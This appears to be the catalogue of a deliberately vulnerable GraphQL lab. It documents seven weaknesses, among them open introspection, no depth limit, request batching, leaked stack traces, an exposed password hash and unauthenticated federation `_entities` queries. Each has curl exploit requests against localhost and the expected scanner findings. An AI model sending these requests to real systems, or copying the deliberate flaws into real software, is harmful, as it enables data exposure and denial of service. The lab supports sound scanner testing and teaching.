# `GQL` — GraphQL itself

Seven weaknesses of the graph, in three services. The `gateway` serves one graph at `POST /graphql`, composed at start from the three subgraphs, and four process-wide settings of that endpoint are weak on purpose: a local sample that lives for minutes has no reason to switch the developer conveniences off, and each is worth testing a scanner against (`GQL-001` to `GQL-004`). A setting has no twin, because the application cannot run both values at once, so each of these entries records the hardened value instead of a counterpart. A fifth, `GQL-007`, is a deployment-level setting: the federation queries of the backend services, `_entities` and `_service`, answer any caller in `accounts` and `notifications`, while the gateway presents its token on every fetch and `trading` requires it. Two operations trust the graph's own shape: a password hash is a selectable field of a legacy record type (`accounts`, `GQL-005`), and an order's `user` reference is built from an argument the caller chose (`trading`, `GQL-006`).

The `gateway` reproductions were run on 2026-11-27 against the gateway alone on `127.0.0.1:4400`, with stand-ins for the three subgraphs; `$A` is Alice's token. `GQL-005` runs against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults). `GQL-006` was run against `trading` alone on `127.0.0.1:4202`, through its HTTP/1.1 relay on `127.0.0.1:4212`. `GQL-007` was run on 2026-11-28 against the whole lab. Each counterpart's claim, and each hardened value's, is scoped: it names the setting or the operation and what it refuses for identical input. Nothing here says any endpoint is secure in general.

<a id="gql-001"></a>
## GQL-001 — introspection and the GraphiQL IDE, served to anyone

<a id="gql-001-agent"></a>
### GQL-001 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — `introspection: true`, `graphiql: true` in the factory.
- **Operation:** `POST /graphql` (introspection), `GET /graphql` with `Accept: text/html` (the IDE).
- **Sink:** the Apollo server's schema reporting and landing page.
- **Flow:** any caller, no credential, reads `__schema`; any browser gets the IDE.
- **Counterparts:** none — a process-wide setting. Hardened value: both `false`.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway alone, against stand-ins) and `tests/e2e/scenarios-graphql.e2e-spec.ts` (the whole lab).
- **Expected finding:** CWE-200 on the module factory. A report on the safe endpoints of the same service for this CWE is a false positive.

<a id="gql-001-student"></a>
### GQL-001 — student guide

Introspection is how a client learns the whole schema: every type, every
field, every argument. In production it is usually switched off, because it
hands an attacker the complete map of the API — here the map of all three
services composed into one graph. The GraphiQL IDE goes further: a page that
runs queries from the browser, served by the endpoint itself, so the attacker
does not even need a client installed. Both are one line each in the module
factory.

<a id="gql-001-exploit"></a>
### GQL-001 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -d '{"query":"{ __schema { types { name } } }"}'
{"data":{"__schema":{"types":[{"name":"Announcement"},{"name":"ID"},{"name":"String"},{"name":"Decimal"},{"name":"Market"},{"name":"Order"},{"name":"Query"},{"name":"User"},…

$ curl -s http://127.0.0.1:4400/graphql -H 'accept: text/html'
…
    <title>GraphiQL</title>
…
```

The observation that proves exploitation: the whole composed graph — the types
of `accounts`, `trading` and `notifications` at once — is returned to a caller
who sent no credential at all, and the second answer is the IDE itself, ready
to run queries. In Postman: `POST {{gatewayUrl}}/graphql` with the
introspection query, then `GET {{gatewayUrl}}/graphql` with `Accept:
text/html`. In Burp: the same two requests, issued in sequence on the graph
endpoint.

<a id="gql-001-safe"></a>
### GQL-001 — vulnerable and protected

A process-wide setting has no twin: the same process cannot serve introspection
and refuse it. The hardened value is recorded here and in the catalogue entry:
`introspection: false` and `graphiql: false`. With both off, `__schema` is
answered with `GRAPHQL_VALIDATION_FAILED`, and `GET /graphql` with
`Accept: text/html` no longer serves the IDE.

**Scoped claim.** A setting has no counterpart to send the identical input to; what is recorded is the hardened value, `introspection: false` and `graphiql: false`. It says only that with both off this query is refused and this page is not served; nothing about any other query.

<a id="gql-001-tests"></a>
### GQL-001 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test posts `__schema {
types { name } }` with no token and asserts the types of all three services
come back; one sends `GET /graphql` with `Accept: text/html` and asserts the
GraphiQL page is served. Both assert the exploit; there is no counterpart test
for a setting.

`tests/e2e/scenarios-graphql.e2e-spec.ts` asserts the same exploit against the whole lab: a setting has no counterpart, so its test asserts the exploit and names the hardened value in the catalogue. The collection `postman/gateway/vuln-nestjs.gateway.postman_collection.json` carries two requests: `GQL-001 introspection answers the whole graph to anyone` and `GQL-001 the GraphiQL IDE is served to a browser`.

<a id="gql-002"></a>
## GQL-002 — no depth or complexity limit

<a id="gql-002-agent"></a>
### GQL-002 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — no `validationRules` in the factory (marked by its absence).
- **Operation:** `POST /graphql`.
- **Sink:** the query planner: a document of any depth is planned and executed.
- **Flow:** `me { orders { user { orders { user { … } } } } }`, nested past any limit, is answered with data.
- **Counterparts:** none. Hardened value: a depth rule with a limit of 5.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway alone, against stand-ins) and `tests/e2e/scenarios-graphql.e2e-spec.ts` (the whole lab).
- **Expected finding:** CWE-770 on the module factory.

<a id="gql-002-student"></a>
### GQL-002 — student guide

A GraphQL server runs what the document asks for. Without a validation rule
that measures depth or complexity, one small document can make the server walk
a cycle of entities again and again: each `orders` asks `trading`, each `user`
asks `accounts` through `_entities`, and the product of the two is work that
grows exponentially with the depth of one request. The hardened value is a limit in
`validationRules` — the gateway ships none.

<a id="gql-002-exploit"></a>
### GQL-002 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" -d @gql002.json
{"data":{"me":{"displayName":"Alice","orders":[{"id":"1","user":{"id":"u-alice","orders":[{"id":"1","user":{"id":"u-alice","orders":[…
```

`gql002.json` is `{"query": "…"}` with a document nested twelve deep
(`me { displayName orders { id user { id …` repeated, 315 bytes; every user of
the seed has two orders, so twelve levels is already a walk of thousands of
entities — deeper walks fan out exponentially). The observation that proves
exploitation: the answer is data, not a refusal, at a depth no operator would
allow (the hardened value is five).

<a id="gql-002-safe"></a>
### GQL-002 — vulnerable and protected

No twin: the limit is a validation rule the whole endpoint either carries or
does not. Hardened value: `validationRules: [depthLimit(5)]` (or an equivalent
rule) in the factory. With it, the document above is refused with
`GRAPHQL_VALIDATION_FAILED` before anything is planned.

**Scoped claim.** A setting has no counterpart to send the identical input to; what is recorded is the hardened value, a depth rule with a limit of 5 in `validationRules`. It says only that with such a rule this document is refused before anything is planned; nothing about every expensive query.

<a id="gql-002-tests"></a>
### GQL-002 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test builds the document
twelve deep and asserts data comes back at every level, with `u-alice` resolved
at the deepest. The depth of the built document is twelve rather than the
specification's twenty-five because the seed's two orders per user make a
twenty-five-deep walk exhaust the test worker's heap — the flaw, the absence of
a limit, is the same at twelve.

`tests/e2e/scenarios-graphql.e2e-spec.ts` asserts the same exploit against the whole lab: a setting has no counterpart, so its test asserts the exploit and names the hardened value in the catalogue. The collection `postman/gateway/vuln-nestjs.gateway.postman_collection.json` carries the request: `GQL-002 a query nested far past any limit is answered with data`.

<a id="gql-003"></a>
## GQL-003 — batched requests: many operations in one call

<a id="gql-003-agent"></a>
### GQL-003 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — `allowBatchedHttpRequests: true` in the factory.
- **Operation:** `POST /graphql` with a JSON array of operation objects.
- **Sink:** the Apollo server's HTTP handling: an array is answered as an array.
- **Flow:** three (or three thousand) operations cross as one request, each executed.
- **Counterparts:** none. Hardened value: `allowBatchedHttpRequests: false`.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway alone, against stand-ins) and `tests/e2e/scenarios-graphql.e2e-spec.ts` (the whole lab).
- **Expected finding:** CWE-307 on the module factory.

<a id="gql-003-student"></a>
### GQL-003 — student guide

Batching is a convenience for clients that can group their reads. It is also
the shape a brute force wants: the rate limit that counts requests sees one,
and the endpoint runs as many operations as the array holds. Ten guesses a
minute becomes ten thousand, because they all fit in a single HTTP request.

<a id="gql-003-exploit"></a>
### GQL-003 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
[{"data":{"__typename":"Query"}}
,{"data":{"__typename":"Query"}}
,{"data":{"__typename":"Query"}}]
```

The observation that proves exploitation: the answer is an array with one entry
per operation — three queries ran for one request. The same array with a
mutation repeated would be a brute force in one call.

<a id="gql-003-safe"></a>
### GQL-003 — vulnerable and protected

No twin: batching is on or off for the whole endpoint. Hardened value:
`allowBatchedHttpRequests: false`. With it, the array is refused before any
operation runs.

**Scoped claim.** A setting has no counterpart to send the identical input to; what is recorded is the hardened value, `allowBatchedHttpRequests: false`. It says only that with batching off this array is refused before any operation runs; nothing about how many requests a caller may send one at a time.

<a id="gql-003-tests"></a>
### GQL-003 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test posts an array of three
different operations and asserts the answer is an array of three, each with its
own data.

`tests/e2e/scenarios-graphql.e2e-spec.ts` asserts the same exploit against the whole lab: a setting has no counterpart, so its test asserts the exploit and names the hardened value in the catalogue. The collection `postman/gateway/vuln-nestjs.gateway.postman_collection.json` carries the request: `GQL-003 one request carries an array of operations`.

<a id="gql-004"></a>
## GQL-004 — a stack trace in every error

<a id="gql-004-agent"></a>
### GQL-004 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — `includeStacktraceInErrorResponses: true` in the factory.
- **Operation:** `POST /graphql` with any invalid document.
- **Sink:** the error formatter: `extensions.stacktrace` reaches the client.
- **Flow:** a validation error answers the server's own frames and file paths.
- **Counterparts:** none. Hardened value: `includeStacktraceInErrorResponses: false`.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway alone, against stand-ins) and `tests/e2e/scenarios-graphql.e2e-spec.ts` (the whole lab).
- **Expected finding:** CWE-209 on the module factory.

<a id="gql-004-student"></a>
### GQL-004 — student guide

Apollo includes the stack trace whenever `NODE_ENV` is not `production` —
which is every run of this lab — and the setting makes it explicit. The stack
tells an attacker what the process runs on, which library versions, and where
in the code an error landed: the frames carry the paths of the very files that
implement the endpoint. It is the GraphQL twin of an unhandled error page, and
it is answered to whoever sends a bad query.

<a id="gql-004-exploit"></a>
### GQL-004 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" -d '{"query":"{ me { nope } }"}'
{"errors":[{"message":"Cannot query field \"nope\" on type \"User\".","locations":[{"line":1,"column":8}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED","stacktrace":["GraphQLError: Cannot query field \"nope\" on type \"User\".","    at Object.Field (/…/graphql/validation/rules/FieldsOnCorrectTypeRule.js:84:13)",…
```

The observation that proves exploitation: `extensions.stacktrace` is an array
of the server's own frames, file paths of the machine included, in the answer
to a caller who asked for a field that does not exist.

<a id="gql-004-safe"></a>
### GQL-004 — vulnerable and protected

No twin. Hardened value: `includeStacktraceInErrorResponses: false`. With it,
the same error answers its message, location and code, and nothing of the
process. (The lab's `formatError` keeps whatever extensions the server put on
the error; that is deliberate and is this scenario.)

**Scoped claim.** A setting has no counterpart to send the identical input to; what is recorded is the hardened value, `includeStacktraceInErrorResponses: false`. It says only that with it off this error answers without `extensions.stacktrace`; nothing about what a message or a location may reveal.

<a id="gql-004-tests"></a>
### GQL-004 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test sends `{ me { nope } }`
and asserts `extensions.stacktrace` is an array of frames containing `at`
lines. Apollo answers a validation failure with status 400; the stack is in
the body either way.

`tests/e2e/scenarios-graphql.e2e-spec.ts` asserts the same exploit against the whole lab: a setting has no counterpart, so its test asserts the exploit and names the hardened value in the catalogue. The collection `postman/gateway/vuln-nestjs.gateway.postman_collection.json` carries the request: `GQL-004 an error answers the server stack`.

<a id="gql-005"></a>
## GQL-005 — the password hash is a field of the record

<a id="gql-005-agent"></a>
### GQL-005 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `whoAmI: UserRecord` |
| Sink | `passwordHash` is a `@Field` of the `UserRecord` type, in `apps/accounts/src/legacy/whoami.resolver.ts` |
| Flow | any token → `whoAmI` → the stored hash is selected and returned |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me`: `User` has no such field), `apps/accounts/src/users/users.resolver.ts` (`user(id)`: admin only, and its `User` has no such field either) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-200, SAST |

<a id="gql-005-student"></a>
### GQL-005 — student guide

The graph's `User` type has no hash field, so no selection of `me` or `user` can ask for one: the schema refuses the query before it runs. The legacy record type added the hash as a field for the old client, and every caller of `whoAmI` can select it.

<a id="gql-005-exploit"></a>
### GQL-005 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ whoAmI { id passwordHash } }"}'
{"data":{"whoAmI":{"id":"u-alice","passwordHash":"scrypt$16384$8$1$23fd6b1132f80ec3…"}}}

$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ me { passwordHash } }"}'
{"errors":[{"message":"Cannot query field \"passwordHash\" on type \"User\".",
  "extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
```

`$TOKEN` is any token the caller holds — the field is there for whoever asks. `user(id: "u-alice") { passwordHash }` as an administrator fails the same way: no such field on `User`; as a user it is refused first (`FORBIDDEN`).

<a id="gql-005-safe"></a>
### GQL-005 — vulnerable and protected

| | Why |
| --- | --- |
| `whoAmI` (vulnerable) | `UserRecord` exposes the stored hash as a selectable field |
| `me` (protected) | `User` carries no hash field: the selection is a validation error before any resolver runs |
| `user(id)` (protected) | An administrator's operation, and still no hash field to select |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the selection `{ passwordHash }` that answers the stored hash through `whoAmI` is a validation error before any resolver runs at `me` and at `user(id)`, because their `User` type has no such field. The claim is not that a hash cannot leak another way; only that no query asks for it through them.

<a id="gql-005-tests"></a>
### GQL-005 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `GQL-005`: `whoAmI` returns the stored hash; `me { passwordHash }` and `user(id) { passwordHash }` are `GRAPHQL_VALIDATION_FAILED`; `user(id)` as a user is `FORBIDDEN`.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `GQL-005: whoAmI returns the password hash`.

<a id="gql-006"></a>
## GQL-006 — an entity reference built from the caller's input

<a id="gql-006-agent"></a>
### GQL-006 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/orders/gift-order.resolver.ts`
- **Operation:** GraphQL `giftOrder(toUserId: ID!, input: PlaceOrderInput!)`, a signed-in user.
- **Sink:** `{ ...order, user: { id: toUserId, orders: [] } }`: the order's `user` reference is built from the caller's argument, not from the stored `order.userId`.
- **Flow:** `args.toUserId` → the reference the gateway resolves is the caller's choice: `accounts` resolves that user's fields when the order is queried with its `user`.
- **Counterparts:** `apps/trading/src/orders/place-order.resolver.ts` (`placeOrder`: no `toUserId` to send, and the reference of a placed order is the stored `userId`), `apps/trading/src/orders/orders.resolver.ts` (`User.orders` through `_entities`: the reference names a user the caller did not choose, and the field resolver checks it).
- **Tests:** `apps/trading/test/scenarios/graph.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report an entity reference built from a caller's argument: CWE-639.

<a id="gql-006-student"></a>
### GQL-006 — student guide

A mutation places an order and then builds the order's `user` reference from an argument the caller chose (`toUserId`), instead of from the stored `order.userId`. The order is stored as the caller's — but the graph now holds a reference to a user the caller had no right to name, and the gateway will resolve that user's fields from `accounts` when the order is queried with its `user`.

The line (`apps/trading/src/orders/gift-order.resolver.ts`):

```ts
// GQL-006 / CWE-639: the user reference is built from the caller's argument, not from the stored order
return { ...order, user: { id: toUserId, orders: [] } };
```

<a id="gql-006-exploit"></a>
### GQL-006 — exploit lab

The reproduction was run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token.

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @gql006.json
# {"toUserId": "u-erin", "input": {"symbol": "BTC-USD", "side": "BUY", "type": "MARKET", "quantity": "0.10000000"}}
{"data":{"giftOrder":{"id":"11","userId":"u-alice","user":{"id":"u-erin"}}}}
```

Alice paid for the order and it is stored as hers — and its `user` is a reference to Erin, whom Alice named. What was gained is the reference: through the gateway, `order { user { … } }` now resolves Erin's profile fields for a caller who never had the right to ask for them.

The same input through the counterpart `placeOrder(input: PlaceOrderInput!)`: there is no `toUserId` to send, the schema refuses it, `"Field \"toUserId\" is not defined by type \"PlaceOrderInput\""`, `BAD_USER_INPUT`, and the reference of a placed order is the stored `userId` — `u-alice` for Alice's own order.

And `User.orders` through `_entities`: no identifier to change. The reference names a user the caller did not choose, and the field resolver checks it — `FORBIDDEN` for Alice on `u-erin`.

<a id="gql-006-safe"></a>
### GQL-006 — vulnerable and protected

| | Operation | What it does with the same input |
| --- | --- | --- |
| Vulnerable | `giftOrder(toUserId, input)` | Stores the order as the caller's and sets its `user` reference to the id the caller named |
| Counterpart 1 | `placeOrder(input)` | Has no `toUserId` to send, the schema refusing the argument, and builds the reference from the stored `userId` |
| Counterpart 2 | `User.orders` through `_entities` | Takes a reference that names a user the caller did not choose, and the field resolver checks the caller against it: `FORBIDDEN` |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the `toUserId` that puts a reference of the caller's choosing on the stored order is not an argument of `placeOrder`, whose reference comes from the stored order, and cannot be handed to the entity field at all, which refuses Alice on Erin's representation. The claim is not that no reference can be misdirected in the graph; only that this argument names no user through them.

<a id="gql-006-tests"></a>
### GQL-006 — tests

`apps/trading/test/scenarios/graph.int-spec.ts`, describe `GQL-006 — giftOrder builds the user reference from the input`. One payload — Alice's order pointed at `u-erin` — sent to all three operations:

- **The exploit:** the order is stored as Alice's and points at Erin.
- **Counterpart 1:** `placeOrder` has no `toUserId` to send, and the reference is the stored user.
- **Counterpart 2:** `User.orders` refuses Alice on Erin's orders: `FORBIDDEN`.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `GQL-006 giftOrder points the order’s user at the caller’s choice`.

<a id="gql-007"></a>
## GQL-007 — the federation queries of the backend services answer any caller

<a id="gql-007-agent"></a>
### GQL-007 — agent reference

- **Source:** `apps/accounts/src/graphql/graphql.module.ts`. Apollo adds `_service` and `_entities` to a subgraph's schema itself, outside the resolvers Nest's global guard runs for, and nothing in accounts asks for a credential on them. The module of `notifications` carries the same weak setting.
- **Operation:** `POST /graphql` on a subgraph's own port — `_service`, `_entities`.
- **Sink:** the federation resolvers: `_entities` resolves any entity by key, to any caller.
- **Flow:** a direct `_entities` call to accounts with no credential reads any user by key, though `user(id)` on the same service is an administrator's question.
- **Counterparts:** `apps/gateway/src/graphql/subgraph-data.source.ts` — the gateway presents `x-internal-token` on every subgraph fetch, composition included. `apps/trading/src/graphql/graphql.module.ts` — it registers `federation-queries.plugin.ts` beside it, which answers the two queries only to that token and refuses any other caller with 403 before a resolver runs.
- **Hardened value:** a subgraph requires `x-internal-token` on `_entities` and `_service`.
- **Tests:** `tests/e2e/scenarios-graphql.e2e-spec.ts` (the lab), `apps/trading/test/federation-queries.int-spec.ts` (the hardened subgraph alone), `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway against stand-ins).
- **Expected finding:** CWE-306 on accounts' GraphQL module. The gateway's data source and trading's module, which registers the plugin, are the controls: a report on them for this CWE is a false positive.

<a id="gql-007-student"></a>
### GQL-007 — student guide

Federation needs two queries that no client should ever send directly:
`_service { sdl }` hands out the subgraph's whole schema, and `_entities`
resolves any entity by its key — the administrator's user record included —
without the field-level checks the graph's own fields carry. The gateway is
the only intended caller, and it proves itself with `x-internal-token` on
every fetch it makes.

The two queries are easy to leave open. Apollo adds them to a subgraph's
schema after the framework's own resolvers are registered, so the guard that
protects every other root field never runs for them: the same request that
`_entities` answers with data is refused by `user(id)`. Closing it is two
halves, and the lab shows both in place in one subgraph and neither in the
other two: the gateway presents the token, trading requires it on the two
federation queries, and accounts and notifications do not — there, anyone
who can reach the port sends the queries.

<a id="gql-007-exploit"></a>
### GQL-007 — exploit lab

Run on 2026-11-28 against the whole lab, started by `pnpm start` on the port
set below. `accounts` and `trading` speak HTTP/2 in cleartext, which curl
cannot send, so they are reached through their relays, which change nothing in
a request ([ADR-012](../../.zazz/architecture/decisions/ADR-012-http1-relay-in-front-of-http2-services.md));
`notifications` speaks HTTP/1.1 on its own listener. On the defaults the
addresses are `3000`, `3201`, `3202` and `3103`.

```console
$ GATEWAY=http://127.0.0.1:4400
$ ACCOUNTS=http://127.0.0.1:4411
$ TRADING=http://127.0.0.1:4412
$ NOTIFICATIONS=http://127.0.0.1:4403
```

The flaw, in accounts — the administrator's record by key, with no credential:

```console
$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _entities(representations: [{__typename: \"User\", id: \"u-admin\"}]) { ... on User { id email displayName } } }"}'
{"data":{"_entities":[{"id":"u-admin","email":"admin@vcx.exchange","displayName":"Admin"}]}}

$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' \
    -d '{"query":"{ user(id: \"u-admin\") { id email } }"}'
{"errors":[{"message":"Authentication required","path":["user"],"locations":[…],"extensions":{"code":"UNAUTHENTICATED",…}}],"data":{"user":null}}

$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' -d '{"query":"{ _service { sdl } }"}' | head -c 100
{"data":{"_service":{"sdl":"extend schema @link(url: \"https://specs.apollo.dev/federation/v2.14",
```

The same weak setting in notifications — an entity by key, with no credential:

```console
$ curl -s $NOTIFICATIONS/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _entities(representations: [{__typename: \"Announcement\", id: \"1\"}]) { ... on Announcement { id title } } }"}'
{"data":{"_entities":[{"id":"1","title":"Welcome to VCX"}]}}
```

The same two queries in trading, which requires the token:

```console
$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _service { sdl } }"}'
{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}

403

$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _entities(representations: [{__typename: \"Order\", id: \"1\"}]) { ... on Order { id userId symbol } } }"}'
{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}

403
```

A session token says who the caller is; it does not say the caller is the
gateway. The two tokens are obtained through the gateway, as any client would:

```console
$ A=$(curl -s $GATEWAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signIn(email: \"alice@vcx.exchange\", password: \"alice-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)

$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ _entities(representations: [{__typename: \"Order\", id: \"1\"}]) { ... on Order { id } } }"}'
{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}

403
```

And the gateway, which presents the token on every fetch, is answered. Each
of these joins is an `_entities` call — the first to accounts, the second to
trading:

```console
$ B=$(curl -s $GATEWAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signIn(email: \"admin@vcx.exchange\", password: \"admin-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)

$ curl -s $GATEWAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ orders { id symbol user { id email displayName } } }"}'
{"data":{"orders":[{"id":"1","symbol":"BTC-USD","user":{"id":"u-alice","email":"alice@vcx.exchange","displayName":"Alice"}},{"id":"6","symbol":"SOL-USD","user":{"id":"u-alice","email":"alice@vcx.exchange","displayName":"Alice"}}]}}

$ curl -s $GATEWAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $B" \
    -d '{"query":"{ user(id: \"u-alice\") { id orders { id symbol } } }"}'
{"data":{"user":{"id":"u-alice","orders":[{"id":"1","symbol":"BTC-USD"},{"id":"6","symbol":"SOL-USD"}]}}}
```

Each error above also carries a stack, in `extensions.stacktrace`, and the
guard's error a copy of the underlying exception; these are left out here,
where `…` stands. The stack is the subject of GQL-004.

The observation that proves exploitation: the first call — `_entities` with
the representation `{__typename: "User", id: "u-admin"}` and no credential at
all — answers the administrator's own record, while the guarded field for the
same record refuses the same caller. The data the service protects is
reachable through the query it never checks. In Postman: `GQL-007 a direct
_entities call reads any user by key` in the gateway collection. In Burp: the
same requests, sent to the accounts relay's address.

<a id="gql-007-safe"></a>
### GQL-007 — vulnerable and protected

| | Why |
| --- | --- |
| `apps/accounts/src/graphql/graphql.module.ts` — vulnerable | `_service` and `_entities` are added to the schema by Apollo's `buildSubgraphSchema`, outside the handlers the global guard wraps. Nothing else asks, so the guard that refuses `user(id)` to the same caller is never consulted. The module of `notifications` is built the same way, and answers the same. |
| `apps/gateway/src/graphql/subgraph-data.source.ts` — protected | `willSendRequest` sets `x-internal-token` on every subgraph fetch, composition included, so a subgraph that asks for it is answered: the last two calls above. |
| `apps/trading/src/graphql/graphql.module.ts` — protected | It registers `federationQueriesNeedTheToken`. Once the operation is validated, and before any resolver, an operation that selects `_entities` or `_service` — at the root, under an alias, through a fragment — is refused with 403 unless the request's `x-internal-token` is the run's own. A session token is not it: that is why the call with `$A` is refused. |

The plugin's registration is the hardened value of the setting, in place in
one of the three subgraphs. The claim is scoped: this pattern closes the two
federation queries of trading to callers that are not the gateway, for the
identical request. It says nothing about any other field of trading, and
nothing about accounts or notifications.

<a id="gql-007-tests"></a>
### GQL-007 — tests

`tests/e2e/scenarios-graphql.e2e-spec.ts`, against the lab: one test sends
`_entities` to accounts' own listener with no credential and asserts
`u-admin`'s record comes back, then the same record through `user(id)`, refused;
one asserts notifications answers the two queries with no credential too; one
sends the two queries to trading and asserts 403, `FORBIDDEN` and no data; one
asserts a plain user's and an administrator's session token change nothing;
one asserts a call presenting the service token is answered and that the
gateway's joins still resolve, the one that is an `_entities` call to trading
among them; one asserts trading's ordinary operations answer as before; one
asserts the same refusal and the same answer through the relay.

`apps/trading/test/federation-queries.int-spec.ts`, the subgraph alone: the
three refusals — no credential, a session token, a query hidden under an
alias and a fragment — and the two answers, with the service token and for an
operation that is neither federation query. With the plugin's registration
removed from the module, its three refusal tests fail. The rest of trading's
suite calls `_entities` as the gateway does, presenting the service token.

`apps/gateway/test/scenarios/gql.int-spec.ts`: the gateway's half, against
stand-ins that play a subgraph either way — with the token required, the
direct call is refused 403 and the graph still answers.
